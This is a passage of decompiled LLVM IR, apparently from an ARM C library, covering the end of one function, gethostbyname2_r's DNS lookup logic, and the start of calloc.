dec_label_pc_1dbf0:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1dbec
  %v1_1dbf4 = phi i32 [ %v1_1dbf4.pre, %bb ], [ 0, %dec_label_pc_1dbec ], [ 1, %.thread7.thread ]
  %v2_1dbf0 = phi i32 [ %v2_1dbf0.pre, %bb ], [ %v3_1db08, %dec_label_pc_1dbec ], [ %v3_1db08, %.thread7.thread ]
  store i32 %v2_1dbf0, i32* @r4, align 4
  ret i32 %v1_1dbf4

; uselistorder directives
  uselistorder i32 %v1_1dbb4, { 1, 0 }
  uselistorder i32 %v5_1dbb0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1dba0, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1dbf0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1dbec, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1db70, { 1, 0 }
  uselistorder label %dec_label_pc_1db38, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp24, i32* %stack_var_0, align 4
  %v6_1dc00 = load i32, i32* @r5, align 4
  %v9_1dc00 = load i32, i32* @r6, align 4
  %v12_1dc00 = load i32, i32* @r7, align 4
  %v15_1dc00 = load i32, i32* @r8, align 4
  %v18_1dc00 = load i32, i32* @sb, align 4
  %v21_1dc00 = load i32, i32* @sl, align 4
  %v24_1dc00 = load i32, i32* @fp, align 4
  %v0_1dc04 = load i32, i32* @r1, align 4
  %v7_1dc04 = icmp eq i32 %v0_1dc04, 2
  store i32 %arg1, i32* @sb, align 4
  %v0_1dc10 = load i32, i32* @r2, align 4
  store i32 %v0_1dc10, i32* @r7, align 4
  %v0_1dc14 = load i32, i32* @r3, align 4
  store i32 %v0_1dc14, i32* @r8, align 4
  br i1 %v7_1dc04, label %dec_label_pc_1dc20, label %dec_label_pc_1dc40

dec_label_pc_1dc20:                               ; preds = %entry
  store i32 %tmp12, i32* @ip, align 4
  store i32 %v0_1dc10, i32* @r1, align 4
  store i32 %v0_1dc14, i32* @r2, align 4
  store i32 %tmp24, i32* @r3, align 4
  %v0_1dc38 = call i32 @gethostbyname_r()
  store i32 %v0_1dc38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1dc40:                               ; preds = %entry
  store i32 0, i32* @sl, align 4
  %v7_1dc48 = icmp eq i32 %v0_1dc04, 10
  %v2_1dc4c = inttoptr i32 %tmp12 to i32*
  store i32 0, i32* %v2_1dc4c, align 4
  br i1 %v7_1dc48, label %dec_label_pc_1dc54, label %dec_label_pc_1deb0

dec_label_pc_1dc54:                               ; preds = %dec_label_pc_1dc40
  %v1_1dc54 = load i32, i32* @sl, align 4
  %v9_1dc54 = icmp eq i32 %v1_1dc54, %arg1
  br i1 %v9_1dc54, label %dec_label_pc_1deb0, label %dec_label_pc_1dc5c

dec_label_pc_1dc5c:                               ; preds = %dec_label_pc_1dc54
  %v0_1dc64 = call i32 @__aeabi_read_tp()
  store i32 %v0_1dc64, i32* %r0.global-to-local, align 4
  %v3_1dc68 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1dc68 = sext i16 %v3_1dc68 to i32
  store i32 %v4_1dc68, i32* @r5, align 4
  store i32 %tmp12, i32* @lr, align 4
  %v2_1dc78 = add i32 %v4_1dc68, %v0_1dc64
  %v3_1dc78 = inttoptr i32 %v2_1dc78 to i32*
  %v4_1dc78 = load i32, i32* %v3_1dc78, align 4
  store i32 %v4_1dc78, i32* @r4, align 4
  store i32 %v0_1dc64, i32* @r6, align 4
  %v0_1dc80 = load i32, i32* @sl, align 4
  store i32 %v0_1dc80, i32* %v3_1dc78, align 4
  %v0_1dc84 = load i32, i32* @sb, align 4
  store i32 %v0_1dc84, i32* %r0.global-to-local, align 4
  %v1_1dc90 = call i32 @__get_hosts_byname_r(i32 %v0_1dc84)
  store i32 %v1_1dc90, i32* %r0.global-to-local, align 4
  %v2_1dc94 = icmp eq i32 %v1_1dc90, 0
  br i1 %v2_1dc94, label %.thread1, label %dec_label_pc_1dca8

.thread1:                                         ; preds = %dec_label_pc_1dc5c
  %v4_1dc9c = load i16, i16* @global_var_32088.1320, align 2
  %v5_1dc9c = sext i16 %v4_1dc9c to i32
  store i32 %v5_1dc9c, i32* %r3.global-to-local, align 4
  %v1_1dca0 = load i32, i32* @r4, align 4
  %v2_1dca0 = load i32, i32* @r6, align 4
  %v4_1dca0 = add i32 %v2_1dca0, %v5_1dc9c
  %v5_1dca0 = inttoptr i32 %v4_1dca0 to i32*
  store i32 %v1_1dca0, i32* %v5_1dca0, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1dca8:                               ; preds = %dec_label_pc_1dc5c
  %v0_1dca8 = load i32, i32* @fp, align 4
  %v1_1dca8 = inttoptr i32 %v0_1dca8 to i32*
  %v2_1dca8 = load i32, i32* %v1_1dca8, align 4
  store i32 %v2_1dca8, i32* %r3.global-to-local, align 4
  %v7_1dcac = icmp eq i32 %v2_1dca8, 1
  br i1 %v7_1dcac, label %dec_label_pc_1dcc8, label %dec_label_pc_1dcb4

dec_label_pc_1dcb4:                               ; preds = %dec_label_pc_1dca8
  %v7_1dcb4 = icmp eq i32 %v2_1dca8, 4
  br i1 %v7_1dcb4, label %dec_label_pc_1dcec, label %dec_label_pc_1dcbc

dec_label_pc_1dcbc:                               ; preds = %dec_label_pc_1dcb4
  %v3_1dcbc = icmp eq i32 %v2_1dca8, -1
  br i1 %v3_1dcbc, label %dec_label_pc_1dcd8, label %dec_label_pc_1deb4

dec_label_pc_1dcc8:                               ; preds = %dec_label_pc_1dca8
  %v7_1dcc8 = icmp eq i32 %v1_1dc90, 2
  br i1 %v7_1dcc8, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1dcc8
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1dcf0

.thread3:                                         ; preds = %dec_label_pc_1dcc8
  store i32 1, i32* @r6, align 4
  br label %dec_label_pc_1dcf0

dec_label_pc_1dcd8:                               ; preds = %dec_label_pc_1dcbc
  %v3_1dcdc = load i16, i16* @global_var_32088.1320, align 2
  %v4_1dcdc = sext i16 %v3_1dcdc to i32
  store i32 %v4_1dcdc, i32* %r3.global-to-local, align 4
  %v0_1dce0 = load i32, i32* @r6, align 4
  %v2_1dce0 = add i32 %v0_1dce0, %v4_1dcdc
  %v3_1dce0 = inttoptr i32 %v2_1dce0 to i32*
  %v4_1dce0 = load i32, i32* %v3_1dce0, align 4
  store i32 %v4_1dce0, i32* %r3.global-to-local, align 4
  %v7_1dce4 = icmp eq i32 %v4_1dce0, 2
  br i1 %v7_1dce4, label %dec_label_pc_1dcec, label %dec_label_pc_1deb4

dec_label_pc_1dcec:                               ; preds = %dec_label_pc_1dcd8, %dec_label_pc_1dcb4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1dcf0

dec_label_pc_1dcf0:                               ; preds = %bb, %.thread3, %dec_label_pc_1dcec
  %v3_1dcf0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1dcf0, i32* %r0.global-to-local, align 4
  %v0_1dcf4 = load i32, i32* @r8, align 4
  %v1_1dcf4 = sub i32 0, %v0_1dcf4
  %v1_1dcf8 = urem i32 %v1_1dcf4, 4
  store i32 %v1_1dcf8, i32* %r1.global-to-local, align 4
  %v2_1dd00 = sub i32 %v3_1dcf0, %v1_1dcf8
  store i32 %v2_1dd00, i32* %r2.global-to-local, align 4
  %v3_1dd04 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1dd04 = sext i16 %v3_1dd04 to i32
  store i32 %v4_1dd04, i32* %r3.global-to-local, align 4
  %v0_1dd08 = call i32 @__aeabi_read_tp()
  store i32 %v0_1dd08, i32* %r0.global-to-local, align 4
  %v1_1dd0c = add i32 %v2_1dd00, -24
  store i32 %v1_1dd0c, i32* @sl, align 4
  %v0_1dd10 = load i32, i32* @r4, align 4
  %v3_1dd10 = add i32 %v4_1dd04, %v0_1dd08
  %v4_1dd10 = inttoptr i32 %v3_1dd10 to i32*
  store i32 %v0_1dd10, i32* %v4_1dd10, align 4
  %v0_1dd14 = load i32, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1dd1c = load i32, i32* @fp, align 4
  %v2_1dd1c = inttoptr i32 %v1_1dd1c to i32*
  store i32 -1, i32* %v2_1dd1c, align 4
  %v7_1dd20 = icmp sgt i32 %v0_1dd14, 255
  br i1 %v7_1dd20, label %dec_label_pc_1dd28, label %bb27

bb27:                                             ; preds = %dec_label_pc_1dcf0
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1dd28:                               ; preds = %dec_label_pc_1dcf0
  %v0_1dd28 = load i32, i32* @r8, align 4
  %v1_1dd28 = load i32, i32* %r1.global-to-local, align 4
  %v2_1dd28 = add i32 %v1_1dd28, %v0_1dd28
  store i32 %v2_1dd28, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1dd30 = add i32 %v2_1dd28, 16
  store i32 %v1_1dd30, i32* %r2.global-to-local, align 4
  %v1_1dd34 = add i32 %v2_1dd28, 24
  store i32 %v1_1dd34, i32* @r5, align 4
  %v3_1dd3c = inttoptr i32 %v1_1dd30 to i32*
  store i32 %v2_1dd28, i32* %v3_1dd3c, align 4
  %v0_1dd40 = load i32, i32* @sb, align 4
  store i32 %v0_1dd40, i32* @r1, align 4
  %v0_1dd44 = load i32, i32* @r4, align 4
  %v1_1dd44 = load i32, i32* %r2.global-to-local, align 4
  %v2_1dd44 = add i32 %v1_1dd44, 4
  %v3_1dd44 = inttoptr i32 %v2_1dd44 to i32*
  store i32 %v0_1dd44, i32* %v3_1dd44, align 4
  %v0_1dd48 = load i32, i32* @r5, align 4
  store i32 %v0_1dd48, i32* %r0.global-to-local, align 4
  %v0_1dd4c = load i32, i32* @sl, align 4
  store i32 %v0_1dd4c, i32* %r2.global-to-local, align 4
  %v3_1dd50 = call i32 @strncpy(i32 %v0_1dd48, i32 %v0_1dd40, i32 %v0_1dd4c)
  %v0_1dd54 = load i32, i32* @r4, align 4
  %v1_1dd54 = trunc i32 %v0_1dd54 to i8
  %v2_1dd54 = load i32, i32* @r5, align 4
  %v3_1dd54 = load i32, i32* @sl, align 4
  %v4_1dd54 = add i32 %v3_1dd54, %v2_1dd54
  %v5_1dd54 = inttoptr i32 %v4_1dd54 to i8*
  store i8 %v1_1dd54, i8* %v5_1dd54, align 1
  %v0_1dd58 = load i32, i32* @sb, align 4
  store i32 %v0_1dd58, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1dd60 = load i32, i32* @r8, align 4
  store i32 %v0_1dd60, i32* %r2.global-to-local, align 4
  %v3_1dd64 = inttoptr i32 %v0_1dd58 to i8*
  %v4_1dd64 = call i32 @inet_pton(i32 10, i8* %v3_1dd64, i32 %v0_1dd60)
  store i32 %v4_1dd64, i32* %r0.global-to-local, align 4
  %v1_1dd68 = load i32, i32* @r4, align 4
  %v9_1dd68 = icmp eq i32 %v4_1dd64, %v1_1dd68
  br i1 %v9_1dd68, label %dec_label_pc_1dda0, label %dec_label_pc_1dd70

dec_label_pc_1dd70:                               ; preds = %dec_label_pc_1dd28
  store i32 %v1_1dd30, i32* @ip, align 4
  %v0_1dd78 = load i32, i32* @r7, align 4
  store i32 %v0_1dd78, i32* %v2_1dc4c, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1dd80 = load i32, i32* @r7, align 4
  %v2_1dd80 = add i32 %v1_1dd80, 8
  %v3_1dd80 = inttoptr i32 %v2_1dd80 to i32*
  store i32 10, i32* %v3_1dd80, align 4
  %v0_1dd84 = load i32, i32* @r4, align 4
  store i32 %v0_1dd84, i32* %r0.global-to-local, align 4
  %v0_1dd88 = load i32, i32* %r3.global-to-local, align 4
  %v1_1dd88 = add i32 %v0_1dd88, 6
  store i32 %v1_1dd88, i32* %r3.global-to-local, align 4
  %v1_1dd8c = load i32, i32* @r7, align 4
  %v2_1dd8c = add i32 %v1_1dd8c, 12
  %v3_1dd8c = inttoptr i32 %v2_1dd8c to i32*
  store i32 %v1_1dd88, i32* %v3_1dd8c, align 4
  %v0_1dd90 = load i32, i32* @r5, align 4
  %v1_1dd90 = load i32, i32* @r7, align 4
  %v2_1dd90 = inttoptr i32 %v1_1dd90 to i32*
  store i32 %v0_1dd90, i32* %v2_1dd90, align 4
  %v0_1dd94 = load i32, i32* @ip, align 4
  %v1_1dd94 = load i32, i32* @r7, align 4
  %v2_1dd94 = add i32 %v1_1dd94, 16
  %v3_1dd94 = inttoptr i32 %v2_1dd94 to i32*
  store i32 %v0_1dd94, i32* %v3_1dd94, align 4
  %v0_1dd98 = load i32, i32* @r4, align 4
  %v1_1dd98 = load i32, i32* @fp, align 4
  %v2_1dd98 = inttoptr i32 %v1_1dd98 to i32*
  store i32 %v0_1dd98, i32* %v2_1dd98, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1dda0:                               ; preds = %dec_label_pc_1dd28
  %v0_1dda0 = load i32, i32* @r6, align 4
  %v2_1dda0 = icmp eq i32 %v0_1dda0, 0
  br i1 %v2_1dda0, label %dec_label_pc_1dda8, label %dec_label_pc_1dea0

dec_label_pc_1dda8:                               ; preds = %dec_label_pc_1dda0
  %v2_1dda8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1dda8, i32* @r4, align 4
  store i32 %v2_1dda8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v3_1ddb8 = bitcast i32* %stack_var_-84 to i8*
  %v4_1ddb8 = call i32 @__GI_memset(i8* %v3_1ddb8, i32 0, i32 40)
  store i32 %v4_1ddb8, i32* %r0.global-to-local, align 4
  %v2_1ddc0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1ddc0, i32* @sb, align 4
  %v7_1de00 = icmp eq i32 %tmp7, 5
  br label %dec_label_pc_1ddc4

dec_label_pc_1ddc4:                               ; preds = %dec_label_pc_1de18, %dec_label_pc_1dda8
  store i32 %v2_1ddc0, i32* %r2.global-to-local, align 4
  store i32 %v2_1dda8, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_1ddd0 = load i32, i32* @r5, align 4
  store i32 %v0_1ddd0, i32* %r0.global-to-local, align 4
  %v4_1ddd4 = inttoptr i32 %v0_1ddd0 to i8*
  %v5_1ddd4 = call i32 @__dns_lookup(i8* %v4_1ddd4, i32 28, i32 %v2_1ddc0, i32 %v2_1dda8)
  store i32 %v5_1ddd4, i32* @r4, align 4
  %v1_1ddd8 = icmp slt i32 %v5_1ddd4, 0
  %v0_1dddc = load i32, i32* @sl, align 4
  store i32 %v0_1dddc, i32* %r2.global-to-local, align 4
  %v0_1dde0 = load i32, i32* @r6, align 4
  %v1_1dde0 = add i32 %v0_1dde0, 1
  store i32 %v1_1dde0, i32* @r6, align 4
  %v0_1dde4 = load i32, i32* @r5, align 4
  store i32 %v0_1dde4, i32* %r0.global-to-local, align 4
  br i1 %v1_1ddd8, label %dec_label_pc_1dea0, label %dec_label_pc_1ddec

dec_label_pc_1ddec:                               ; preds = %dec_label_pc_1ddc4
  %v3_1ddec = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1ddec, i32* @r1, align 4
  %v3_1ddf0 = call i32 @strncpy(i32 %v0_1dde4, i32 %v3_1ddec, i32 %v0_1dddc)
  %v3_1ddf4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1ddf4, i32* @r0, align 4
  %v0_1ddf8 = call i32 @free()
  store i32 %v0_1ddf8, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r1.global-to-local, align 4
  %v0_1de04 = load i32, i32* @r4, align 4
  store i32 %v0_1de04, i32* %r2.global-to-local, align 4
  %v0_1de08 = load i32, i32* @r5, align 4
  store i32 %v0_1de08, i32* @r3, align 4
  br i1 %v7_1de00, label %dec_label_pc_1de10, label %dec_label_pc_1de48

dec_label_pc_1de10:                               ; preds = %dec_label_pc_1ddec
  %v0_1de10 = load i32, i32* @r6, align 4
  %v8_1de14 = icmp sgt i32 %v0_1de10, 5
  br i1 %v8_1de14, label %dec_label_pc_1de3c, label %dec_label_pc_1de18

dec_label_pc_1de18:                               ; preds = %dec_label_pc_1de10
  store i32 %tmp6, i32* @r1, align 4
  %v3_1de1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1de1c, i32* %r0.global-to-local, align 4
  %v0_1de20 = load i32, i32* @sl, align 4
  %v5_1de24 = call i32 @__decode_dotted(i32 %v3_1de1c, i32 %tmp6, i32 %v0_1de04, i32 %v0_1de08, i32 %v0_1de20)
  store i32 %v5_1de24, i32* @r4, align 4
  %v3_1de2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1de2c, i32* @r0, align 4
  %v0_1de30 = call i32 @free()
  store i32 %v0_1de30, i32* %r0.global-to-local, align 4
  %v0_1de34 = load i32, i32* @r4, align 4
  %v1_1de34 = icmp slt i32 %v0_1de34, 0
  br i1 %v1_1de34, label %dec_label_pc_1de3c, label %dec_label_pc_1ddc4

dec_label_pc_1de3c:                               ; preds = %dec_label_pc_1de18, %dec_label_pc_1de10
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dea8

dec_label_pc_1de48:                               ; preds = %dec_label_pc_1ddec
  %v7_1de48 = icmp eq i32 %tmp7, 28
  br i1 %v7_1de48, label %dec_label_pc_1de50, label %dec_label_pc_1de98

dec_label_pc_1de50:                               ; preds = %dec_label_pc_1de48
  store i32 16, i32* @r2, align 4
  %v0_1de58 = load i32, i32* @r8, align 4
  store i32 %v0_1de58, i32* @r0, align 4
  %v0_1de5c = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1dd30, i32* @lr, align 4
  %v1_1de68 = load i32, i32* @r7, align 4
  %v2_1de68 = add i32 %v1_1de68, 8
  %v3_1de68 = inttoptr i32 %v2_1de68 to i32*
  store i32 10, i32* %v3_1de68, align 4
  %v0_1de6c = load i32, i32* %r3.global-to-local, align 4
  %v1_1de6c = add i32 %v0_1de6c, 6
  store i32 %v1_1de6c, i32* %r3.global-to-local, align 4
  %v1_1de70 = load i32, i32* @r7, align 4
  %v2_1de70 = add i32 %v1_1de70, 12
  %v3_1de70 = inttoptr i32 %v2_1de70 to i32*
  store i32 %v1_1de6c, i32* %v3_1de70, align 4
  %v3_1de74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1de74, i32* @r0, align 4
  %v0_1de78 = load i32, i32* @r5, align 4
  %v1_1de78 = load i32, i32* @r7, align 4
  %v2_1de78 = inttoptr i32 %v1_1de78 to i32*
  store i32 %v0_1de78, i32* %v2_1de78, align 4
  %v0_1de7c = load i32, i32* @lr, align 4
  %v1_1de7c = load i32, i32* @r7, align 4
  %v2_1de7c = add i32 %v1_1de7c, 16
  %v3_1de7c = inttoptr i32 %v2_1de7c to i32*
  store i32 %v0_1de7c, i32* %v3_1de7c, align 4
  %v0_1de80 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1de90 = load i32, i32* @r7, align 4
  store i32 %v0_1de90, i32* %v2_1dc4c, align 4
  %v0_1dea8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dea8

dec_label_pc_1de98:                               ; preds = %dec_label_pc_1de48
  %v3_1de98 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1de98, i32* @r0, align 4
  %v0_1de9c = call i32 @free()
  store i32 %v0_1de9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dea0

dec_label_pc_1dea0:                               ; preds = %dec_label_pc_1ddc4, %dec_label_pc_1dda0, %dec_label_pc_1de98
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dea8

dec_label_pc_1dea8:                               ; preds = %dec_label_pc_1de50, %dec_label_pc_1de3c, %dec_label_pc_1dea0
  %v0_1dea8 = phi i32 [ %v0_1dea8.pre, %dec_label_pc_1de50 ], [ 3, %dec_label_pc_1de3c ], [ 1, %dec_label_pc_1dea0 ]
  %v1_1dea8 = load i32, i32* @fp, align 4
  %v2_1dea8 = inttoptr i32 %v1_1dea8 to i32*
  store i32 %v0_1dea8, i32* %v2_1dea8, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1deb0:                               ; preds = %dec_label_pc_1dc40, %dec_label_pc_1dc54
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1deb4:                               ; preds = %.thread1, %bb27, %dec_label_pc_1dcd8, %dec_label_pc_1dcbc, %dec_label_pc_1dea8, %dec_label_pc_1dd70, %dec_label_pc_1dc20, %dec_label_pc_1deb0
  store i32 %v6_1dc00, i32* @r5, align 4
  store i32 %v9_1dc00, i32* @r6, align 4
  store i32 %v12_1dc00, i32* @r7, align 4
  store i32 %v15_1dc00, i32* @r8, align 4
  store i32 %v18_1dc00, i32* @sb, align 4
  store i32 %v21_1dc00, i32* @sl, align 4
  store i32 %v24_1dc00, i32* @fp, align 4
  %v1_1debc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1debc

; uselistorder directives
  uselistorder i32 %v2_1dda8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1dd30, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1dcf8, { 1, 0 }
  uselistorder i32 %v0_1dc64, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp12, { 3, 2, 0, 1 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 16, 18, 17, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder label %dec_label_pc_1deb4, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1deb0, { 1, 0 }
  uselistorder label %dec_label_pc_1dea8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1dea0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1dcf0, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1ded4 = load i32, i32* @r4, align 4
  %v6_1ded4 = load i32, i32* @r5, align 4
  %v9_1ded4 = load i32, i32* @r6, align 4
  %v12_1ded4 = load i32, i32* @lr, align 4
  %v2_1dedc = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1deec = mul i32 %arg2, %arg1
  store i32 %v2_1deec, i32* @r6, align 4
  br i1 %v2_1dedc, label %dec_label_pc_1df24, label %dec_label_pc_1def4

dec_label_pc_1def4:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_1defc = udiv i32 %v2_1deec, %arg1
  %v9_1df00 = icmp eq i32 %v2_1defc, %arg2
  br i1 %v9_1df00, label %dec_label_pc_1df24, label %dec_label_pc_1df08

dec_label_pc_1df08:                               ; preds = %dec_label_pc_1def4
  %v0_1df0c = call i32 @__aeabi_read_tp()
  %v3_1df10 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1df10 = sext i16 %v3_1df10 to i32
  store i32 %v4_1df10, i32* @r2, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1df1c = add i32 %v4_1df10, %v0_1df0c
  %v4_1df1c = inttoptr i32 %v3_1df1c to i32*
  store i32 12, i32* %v4_1df1c, align 4
  br label %dec_label_pc_1dfe8

dec_label_pc_1df24:                               ; preds = %dec_label_pc_1def4, %entry
  %v4_1df28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 120) to i32*), align 4
  store i32 %v4_1df28, i32* @r4, align 4
  %v4_1df40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  store i32 %v4_1df40, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1df40)
  %v0_1df54 = load i32, i32* @r5, align 4
  %v2_1df54 = add i32 %v0_1df54, 20
  %v3_1df54 = inttoptr i32 %v2_1df54 to i32*
  %v4_1df54 = load i32, i32* %v3_1df54, align 4
  store i32 %v4_1df54, i32* %ip.global-to-local, align 4
  store i32 122720, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1df54)
  %v0_1df60 = load i32, i32* @r6, align 4
  %v1_1df64 = call i32 @malloc(i32 %v0_1df60)
  store i32 %v1_1df64, i32* %r4.global-to-local, align 4
  %v2_1df68 = icmp eq i32 %v1_1df64, 0
  br i1 %v2_1df68, label %.thread, label %dec_label_pc_1df70

dec_label_pc_1df70:                               ; preds = %dec_label_pc_1df24
  %v1_1df70 = add i32 %v1_1df64, -4
  %v2_1df70 = inttoptr i32 %v1_1df70 to i32*
  %v3_1df70 = load i32, i32* %v2_1df70, align 4
  %v1_1df74 = and i32 %v3_1df70, 2
  %v2_1df74 = icmp eq i32 %v1_1df74, 0
  br i1 %v2_1df74, label %dec_label_pc_1df7c, label %.thread

dec_label_pc_1df7c:                               ; preds = %dec_label_pc_1df70
  %v1_1df7c6 = add i32 %v3_1df70, -4
  %v1_1df80 = and i32 %v1_1df7c6, -4
  store i32 %v1_1df80, i32* @r2, align 4
  %v3_1df84 = udiv i32 %v1_1df80, 4
  store i32 %v3_1df84, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1df80, 36
  %v2_1df8c = icmp ult i32 %v1_1df80, 33
  %v3_1df8c = or i1 %tmp, %v2_1df8c
  br i1 %v3_1df8c, label %dec_label_pc_1df98, label %dec_label_pc_1df90

dec_label_pc_1df90:                               ; preds = %dec_label_pc_1df7c
  %v3_1df90 = inttoptr i32 %v1_1df64 to i8*
  %v4_1df90 = call i32 @__GI_memset(i8* %v3_1df90, i32 0, i32 %v1_1df80)
  br label %.thread

dec_label_pc_1df98:                               ; preds = %dec_label_pc_1df7c
  %tmp7 = icmp eq i32 %v1_1df80, 16
  %v2_1df9c = inttoptr i32 %v1_1df64 to i32*
  store i32 0, i32* %v2_1df9c, align 4
  %v1_1dfa0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfa0 = add i32 %v1_1dfa0, 4
  %v3_1dfa0 = inttoptr i32 %v2_1dfa0 to i32*
  store i32 0, i32* %v3_1dfa0, align 4
  %v1_1dfa4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfa4 = add i32 %v1_1dfa4, 8
  %v3_1dfa4 = inttoptr i32 %v2_1dfa4 to i32*
  store i32 0, i32* %v3_1dfa4, align 4
  %v2_1dfa8 = icmp ult i32 %v1_1df80, 13
  %v3_1dfa8 = or i1 %tmp7, %v2_1dfa8
  br i1 %v3_1dfa8, label %.thread, label %dec_label_pc_1dfac

dec_label_pc_1dfac:                               ; preds = %dec_label_pc_1df98
  %v0_1dfac = load i32, i32* %ip.global-to-local, align 4
  %v1_1dfb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfb0 = add i32 %v1_1dfb0, 12
  %v3_1dfb0 = inttoptr i32 %v2_1dfb0 to i32*
  store i32 0, i32* %v3_1dfb0, align 4
  %v1_1dfb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfb4 = add i32 %v1_1dfb4, 16
  %v3_1dfb4 = inttoptr i32 %v2_1dfb4 to i32*
  store i32 0, i32* %v3_1dfb4, align 4
  %tmp8 = icmp ult i32 %v0_1dfac, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1dfbc

dec_label_pc_1dfbc:                               ; preds = %dec_label_pc_1dfac
  %v0_1dfbc = load i32, i32* %ip.global-to-local, align 4
  %v7_1dfbc = icmp eq i32 %v0_1dfbc, 9
  %v1_1dfc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfc0 = add i32 %v1_1dfc0, 20
  %v3_1dfc0 = inttoptr i32 %v2_1dfc0 to i32*
  store i32 0, i32* %v3_1dfc0, align 4
  %v1_1dfc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfc4 = add i32 %v1_1dfc4, 24
  %v3_1dfc4 = inttoptr i32 %v2_1dfc4 to i32*
  store i32 0, i32* %v3_1dfc4, align 4
  br i1 %v7_1dfbc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1dfbc
  %v2_1dfc8 = load i32, i32* %r4.global-to-local, align 4
